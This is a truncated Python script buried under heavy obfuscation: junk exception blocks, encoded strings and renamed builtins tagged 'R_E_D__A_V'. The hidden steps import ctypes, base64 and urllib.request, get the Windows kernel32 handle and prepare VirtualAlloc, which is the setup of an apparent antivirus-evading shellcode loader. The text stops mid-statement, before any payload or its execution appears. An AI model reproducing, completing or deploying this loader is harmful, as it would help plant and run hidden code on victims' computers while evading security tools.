__3363546272586 = 0
__3363546272586 += 1
try:
    raise MemoryError(__3363546272586)
except MemoryError as __7781566800339:
    if __7781566800339.args[0] == 1:
        globals()['R_E_D__A_V_______'] = bool if bool(bool(bool(bool))) < bool(type(int(610) > int(188) < int(174) > int(15))) and bool(str(str(193) > int(1217) < int(78) > int(188))) > 2 else bool
    if __7781566800339.args[0] == 3:
        __2122201608157 = 117004155496101
    if __7781566800339.args[0] == 4:
        __7008434509462 = 104433198623509
    if __7781566800339.args[0] == 5:
        __7651019386207 = 88162015481421
__5896932873894 = 0
__5896932873894 += 1
try:
    raise MemoryError(__5896932873894)
except MemoryError as __3765042541179:
    if __3765042541179.args[0] == 1:
        globals()['R_E_D__A_V______'] = str if bool(bool(bool(str))) < bool(type(int(1610) > int(131) < int(73) > int(1614))) and bool(str(str(217) > int(1418) < int(412) > int(62))) > 2 else str
    if __3765042541179.args[0] == 3:
        __6900907254590 = 55371194982171
__3475255884049 = 0
__3475255884049 += 1
try:
    raise MemoryError(__3475255884049)
except MemoryError as __8207584117700:
    if __8207584117700.args[0] == 1:
        globals()['R_E_D__A_V________'] = type if bool(bool(bool(type))) < bool(type(int(67) > int(718) < int(1314) > int(24))) and bool(str(str(316) > int(164) < int(136) > int(148))) > 2 else type
    if __8207584117700.args[0] == 3:
        __5154513339726 = 241468591584391
    if __8207584117700.args[0] == 4:
        __5097604357041 = 68586273385630
    if __8207584117700.args[0] == 5:
        __2305686778574 = 99137376207826
__8573624845069 = 0
__8573624845069 += 1
try:
    raise MemoryError(__8573624845069)
except MemoryError as __2528919231194:
    if __2528919231194.args[0] == 1:
        globals()['R_E_D__A_V_____'] = int if bool(bool(bool(int))) < bool(type(int(132) > int(52) < int(1719) > int(318))) and bool(str(str(134) > int(27) < int(1910) > int(15))) > 2 else int
    if __2528919231194.args[0] == 3:
        __6296497006225 = 167289196105639
__2872286702865 = 0
__2872286702865 += 1
try:
    raise MemoryError(__2872286702865)
except MemoryError as __3335167236349:
    if __3335167236349.args[0] == 1:
        globals()['R_E_D__A_V_________'] = bytes if bool(bool(bool(bytes))) < bool(type(int(113) > int(52) < int(913) > int(119))) and bool(str(str(43) > int(910) < int(1712) > int(132))) > 2 else bytes
    if __3335167236349.args[0] == 3:
        __5077380067347 = 70057972742569
    if __3335167236349.args[0] == 4:
        __2733734478952 = 145173698795561
    if __3335167236349.args[0] == 5:
        __7989360727077 = 19509730577717
__3926141201238 = 0
__3926141201238 += 1
try:
    raise MemoryError(__3926141201238)
except MemoryError as __3616774494656:
    if __3616774494656.args[0] == 1:
        globals()['R_E_D__A_V__________'] = vars if bool(bool(bool(vars))) < bool(type(int(1417) > int(1714) < int(711) > int(119))) and bool(str(str(193) > int(143) < int(311) > int(1316))) > 2 else vars
    if __3616774494656.args[0] == 3:
        __3335639088015 = 156468291790047
    if __3616774494656.args[0] == 4:
        __7271273447440 = 257429679974844
    if __3616774494656.args[0] == 5:
        __4540717590381 = 266417837792937
    if __3616774494656.args[0] == 6:
        __3966854273696 = 131414758564345
    if __3616774494656.args[0] == 7:
        __3777739956196 = 115087507883712
__7157005976497 = 0
__7157005976497 += 1
try:
    raise MemoryError(__7157005976497)
except MemoryError as __2527054092757:
    if __2527054092757.args[0] == 1:
        globals()['R_E_D__A_V____________'] = callable if bool(bool(bool(callable))) < bool(type(int(95) > int(116) < int(97) > int(313))) and bool(str(str(68) > int(1514) < int(817) > int(1312))) > 2 else callable
    if __2527054092757.args[0] == 3:
        __5164640427059 = 216040978154590
    if __2527054092757.args[0] == 4:
        __6709402023602 = 274213703586140
    if __2527054092757.args[0] == 5:
        __3346654919516 = 259964553065840
    if __2527054092757.args[0] == 6:
        __4230843708669 = 228982339447244
    if __2527054092757.args[0] == 7:
        __4805863176834 = 6941163718212
__4778517120474 = 0
__4778517120474 += 1
try:
    raise MemoryError(__4778517120474)
except MemoryError as __6294400136326:
    if __6294400136326.args[0] == 1:
        globals()['R_E_D__A_V____'] = eval if bool(bool(bool(eval))) < bool(type(int(1117) > int(614) < int(214) > int(194))) and bool(str(str(1114) > int(1711) < int(114) > int(810))) > 2 else eval
    if __6294400136326.args[0] == 3:
        __3691922169663 = 58563862451834
    if __6294400136326.args[0] == 4:
        __7705369548926 = 37070527913329
    if __6294400136326.args[0] == 5:
        __7988140179021 = 146402742801287
    if __6294400136326.args[0] == 6:
        __7954706359976 = 63158118285450
    if __6294400136326.args[0] == 7:
        __6457206112315 = 236127017949110
__3258035135445 = 0
__3258035135445 += 1
try:
    raise MemoryError(__3258035135445)
except MemoryError as __4356129871659:
    if __4356129871659.args[0] == 1:
        globals()['______________R_E_D__A_V______________'] = list if bool(bool(bool(list))) < bool(type(int(193) > int(113) < int(710) > int(1613))) and bool(str(str(136) > int(1412) < int(102) > int(1017))) > 2 else list
    if __4356129871659.args[0] == 3:
        __7406243381877 = 94522217160726
    if __4356129871659.args[0] == 4:
        __2590786983186 = 54858204761231
__7660076105988 = 0
__7660076105988 += 1
try:
    raise MemoryError(__7660076105988)
except MemoryError as __5735803906788:
    if __5735803906788.args[0] == 1:
        globals()['R_E_D__A_V______________'] = map if bool(bool(bool(map))) < bool(type(int(1716) > int(27) < int(710) > int(138))) and bool(str(str(171) > int(96) < int(1216) > int(714))) > 2 else map
    if __5735803906788.args[0] == 3:
        __3702862278236 = 108815305883646
__6238706042262 = 0
__6238706042262 += 1
try:
    raise MemoryError(__6238706042262)
except MemoryError as __3897998328004:
    if __3897998328004.args[0] == 1:
        globals()['R_E_D__A_V___'] = __import__ if bool(bool(bool(__import__))) < bool(type(int(198) > int(1416) < int(112) > int(52))) and bool(str(str(219) > int(39) < int(1011) > int(97))) > 2 else __import__
    if __3897998328004.args[0] == 3:
        __6235075871803 = 84952183000720
    if __3897998328004.args[0] == 4:
        __3890473086515 = 150736769931526
    if __3897998328004.args[0] == 5:
        __2555248168114 = 161475781980838
__7947661397530 = 0
__7947661397530 += 1
try:
    raise MemoryError(__7947661397530)
except MemoryError as __3421735586093:
    if __3421735586093.args[0] == 1:
        globals()['tryᅠ'] = print if bool(bool(bool(print))) < bool(type(int(117) > int(212) < int(1413) > int(411))) and bool(str(str(1017) > int(147) < int(712) > int(136))) > 2 else print
    if __3421735586093.args[0] == 3:
        __5978269560958 = 85439999516203
    if __3421735586093.args[0] == 4:
        __3213772989139 = 218723743567043
__3137013646353 = 0
__3137013646353 += 1
try:
    raise MemoryError(__3137013646353)
except MemoryError as __5118398451002:
    if __5118398451002.args[0] == 1:
        globals()['exceptᅠ'] = input if bool(bool(bool(input))) < bool(type(int(612) > int(106) < int(16) > int(15))) and bool(str(str(111) > int(111) < int(1619) > int(73))) > 2 else input
    if __5118398451002.args[0] == 3:
        __6855776195741 = 95942503710544
    if __5118398451002.args[0] == 4:
        __5943648889998 = 23922230988626

def R_E_D__A_V____(RED_DEFENDER, *k):
    __2697743254081 = 0
    __2697743254081 += 1
    try:
        raise MemoryError(__2697743254081)
    except MemoryError as __7262185959867:
        if __7262185959867.args[0] == 1:
            if k:
                R_E_D____A_V = '+'
                op = '+'
            else:
                R_E_D____A_V = ''
                op = ''
        if __7262185959867.args[0] == 1:
            globals()['_1611'] = (lambda: (lambda _28: _28 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __7262185959867.args[0] == 1:
            globals()['R_E_D__A_V____'] = R_E_D__A_V____
        if __7262185959867.args[0] == 1:
            globals()['R_E_D__A_V______'] = R_E_D__A_V______
        if __7262185959867.args[0] == 1:
            globals()['RED_DEFENDER'] = RED_DEFENDER
        if __7262185959867.args[0] == 1:
            for globals()['R_E_D____A_V_'] in globals()['RED_DEFENDER']:
                if not _1611:
                    globals()['R_E_D____A_V_'] += (lambda: '')()
                R_E_D____A_V += R_E_D__A_V______(R_E_D____A_V_)
                f = (lambda: (lambda _97: _97 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __7262185959867.args[0] == 1:
            return R_E_D____A_V
        if __7262185959867.args[0] == 9:
            __7609397558348 = 70332913364588
        if __7262185959867.args[0] == 10:
            __5106547980900 = 260053222200240
        if __7262185959867.args[0] == 11:
            __4991312767010 = 215137314196749

def ______R_E_D__A_V_______(x):
    __2068818813915 = 0
    __2068818813915 += 1
    try:
        raise MemoryError(__2068818813915)
    except MemoryError as __5412735392632:
        if __5412735392632.args[0] == 1:
            return R_E_D__A_V_____(x - 30583)
        if __5412735392632.args[0] == 3:
            __7731219268083 = 181014135650702
        if __5412735392632.args[0] == 4:
            __8629488511714 = 252856033509662
        if __5412735392632.args[0] == 5:
            __4551985310131 = 265559160542660
        if __5412735392632.args[0] == 6:
            __2515499615203 = 15186986722627

def R_E_D__A_V(e):
    __7169378168700 = 0
    __7169378168700 += 1
    try:
        raise MemoryError(__7169378168700)
    except MemoryError as __7906774815712:
        if __7906774815712.args[0] == 1:
            br = bytearray(e[len(b'R_E_D__A_V__'):])
        if __7906774815712.args[0] == 1:
            r = 0
        if __7906774815712.args[0] == 1:
            for b in br:
                r = r * 256 + b
        if __7906774815712.args[0] == 1:
            return r
        if __7906774815712.args[0] == 6:
            __3080798767973 = 158254871296165
        if __7906774815712.args[0] == 7:
            __8267564010542 = 9887757113541
        if __7906774815712.args[0] == 8:
            __7220242685063 = 16428694320259

def ____________________________(x):
    __7330506772620 = 0
    __7330506772620 += 1
    try:
        raise MemoryError(__7330506772620)
    except MemoryError as __5376262218199:
        if __5376262218199.args[0] == 1:
            ar = []
        if __5376262218199.args[0] == 1:
            for i in x:
                ar.append(R_E_D__A_V____(i))
        if __5376262218199.args[0] == 1:
            return ar
        if __5376262218199.args[0] == 5:
            __2390404990503 = 34723518406228
        if __5376262218199.args[0] == 6:
            __3923807340754 = 250305374997211
        if __5376262218199.args[0] == 7:
            __7408173948530 = 174974479007793
if (lambda: (lambda _913: _913 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)():

    def R_E_D__A_V_______________(R_E_D__A_V____________):
        R_E_D__A_V____________ = R_E_D__A_V____________ - 16742655
        if R_E_D__A_V____________ <= 127:
            return R_E_D__A_V______(R_E_D__A_V_________([R_E_D__A_V____________]), 'utf8')
        elif R_E_D__A_V____________ <= 2047:
            if 1 < 2:
                b1 = 192 | R_E_D__A_V____________ >> 6
            b2 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2]), 'utf8')
        elif R_E_D__A_V____________ <= 65535:
            b1 = 224 | R_E_D__A_V____________ >> 12
            if 2 > 1:
                b2 = 128 | R_E_D__A_V____________ >> 6 & 63
            b3 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3]), 'utf8')
        else:
            b1 = 240 | R_E_D__A_V____________ >> 18
            if 2 == 2:
                b2 = 128 | R_E_D__A_V____________ >> 12 & 63
            if 1 < 2 < 3:
                b3 = 128 | R_E_D__A_V____________ >> 6 & 63
            b4 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3, b4]), 'utf8')

    def _hex(j):
        R_E_D__A_V____________ = ''
        for _hex in j:
            R_E_D__A_V____________ += R_E_D__A_V_______________(_hex)
        return R_E_D__A_V____________
else:
    'R_E_D____A_V'
try:
    match '1012' == '156':
        case True:
            raise MemoryError([True])
        case False:
            _1213 = [[True], [False]]
            R_E_D__A_V______(['_1415'])
    raise MemoryError([True])
except MemoryError as _1314:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742705]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _53: _53 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1817 = [[(lambda: (lambda _613: _613 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _318: _318 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda: (lambda _133: _133 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _316:
        import sys
try:
    match '411' == '54':
        case True:
            raise MemoryError([True])
        case False:
            _211 = [[True], [False]]
            R_E_D__A_V______(['_107'])
    raise MemoryError([True])
except MemoryError as _314:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _39: _39 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _315 = [[(lambda: (lambda _1917: _1917 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _187: _187 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742704, 16742706]))))())())()])
        raise MemoryError([(lambda: (lambda _58: _58 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1915:
        import ctypes
try:
    match '619' == '1419':
        case True:
            raise MemoryError([True])
        case False:
            _82 = [[True], [False]]
            R_E_D__A_V______(['_155'])
    raise MemoryError([True])
except MemoryError as _211:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742703]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1115: _1115 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _717 = [[(lambda: (lambda _52: _52 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1219: _1219 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _1015: _1015 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _152:
        import base64
try:
    match '811' == '141':
        case True:
            raise MemoryError([True])
        case False:
            _138 = [[True], [False]]
            R_E_D__A_V______(['_1018'])
    raise MemoryError([True])
except MemoryError as _15:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _104: _104 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _129 = [[(lambda: (lambda _713: _713 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _18: _18 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742706]))))())())()])
        raise MemoryError([(lambda: (lambda _1211: _1211 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _101:
        import ctypes.wintypes as wt
try:
    match '1913' == '199':
        case True:
            raise MemoryError([True])
        case False:
            _316 = [[True], [False]]
            R_E_D__A_V______(['_119'])
    raise MemoryError([True])
except MemoryError as _171:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _611: _611 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _39 = [[(lambda: (lambda _1117: _1117 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _513: _513 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _418: _418 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1417:
        import urllib.request
try:
    match '126' == '45':
        case True:
            raise MemoryError([True])
        case False:
            _143 = [[True], [False]]
            R_E_D__A_V______(['_218'])
    raise MemoryError([True])
except MemoryError as _118:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742705]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _32: _32 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1713 = [[(lambda: (lambda _711: _711 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _74: _74 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _310: _310 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _96:
        __8232590416548 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '103' == '51':
        case True:
            raise MemoryError([True])
        case False:
            _124 = [[True], [False]]
            R_E_D__A_V______(['_147'])
    raise MemoryError([True])
except MemoryError as _116:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _15: _15 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1215 = [[(lambda: (lambda _175: _175 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1517: _1517 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _1219: _1219 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _217:
        __8232590416548 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '25' == '1814':
        case True:
            raise MemoryError([True])
        case False:
            _64 = [[True], [False]]
            R_E_D__A_V______(['_156'])
    raise MemoryError([True])
except MemoryError as _98:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1917: _1917 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _137 = [[(lambda: (lambda _165: _165 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _518: _518 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _37: _37 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _181:
        try:
            raise MemoryError(__8232590416548)
        except MemoryError as __3343133618630:
            if __3343133618630.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32 = ctypes.windll.kernel32
            if __3343133618630.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3457875083701 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xed\xff\xf3\xe7\x1f\xca'))()
            if __3343133618630.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __6165480925964 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x1c\xb3\xa8D\x8c\x08'))()
            if __3343133618630.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __6410992442506 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x12\xf6\x15\xfd\x87\xed'))()
try:
    match '912' == '1912':
        case True:
            raise MemoryError([True])
        case False:
            _54 = [[True], [False]]
            R_E_D__A_V______(['_919'])
    raise MemoryError([True])
except MemoryError as _121:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742705]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _185: _185 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _64 = [[(lambda: (lambda _85: _85 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _617: _617 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _1519: _1519 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _159:
        __3664035982118 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '817' == '157':
        case True:
            raise MemoryError([True])
        case False:
            _411 = [[True], [False]]
            R_E_D__A_V______(['_45'])
    raise MemoryError([True])
except MemoryError as _519:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _195: _195 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _124 = [[(lambda: (lambda _1613: _1613 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1118: _1118 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _719: _719 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _813:
        __3664035982118 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1611' == '185':
        case True:
            raise MemoryError([True])
        case False:
            _814 = [[True], [False]]
            R_E_D__A_V______(['_104'])
    raise MemoryError([True])
except MemoryError as _121:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704, 16742703]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1013: _1013 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _161 = [[(lambda: (lambda _1117: _1117 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _315: _315 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _1611: _1611 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _810:
        try:
            raise MemoryError(__3664035982118)
        except MemoryError as __8417197137550:
            if __8417197137550.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
            if __8417197137550.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __7038179759217 = (lambda: R_E_D__A_V(b'R_E_D__A_V__wb(\x9f\x8e:'))()
            if __8417197137550.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __3652359294299 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x9eJ\xb0\xa0\xcf\x96'))()
            if __8417197137550.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __6885756533234 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\\]\xafI60'))()
            if __8417197137550.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __5998577143583 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x958e\x96&\x97'))()
            if __8417197137550.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x07'))():
                __6466466194555 = (lambda: R_E_D__A_V(b'R_E_D__A_V__7\xb1\xb9\x9a\xc5\xf1'))()
try:
    match '1610' == '718':
        case True:
            raise MemoryError([True])
        case False:
            _1916 = [[True], [False]]
            R_E_D__A_V______(['_914'])
    raise MemoryError([True])
except MemoryError as _218:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _517: _517 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1711 = [[(lambda: (lambda _166: _166 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _171: _171 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _1018: _1018 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _126:
        __4561348713529 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '193' == '83':
        case True:
            raise MemoryError([True])
        case False:
            _23 = [[True], [False]]
            R_E_D__A_V______(['_115'])
    raise MemoryError([True])
except MemoryError as _1419:
    try:
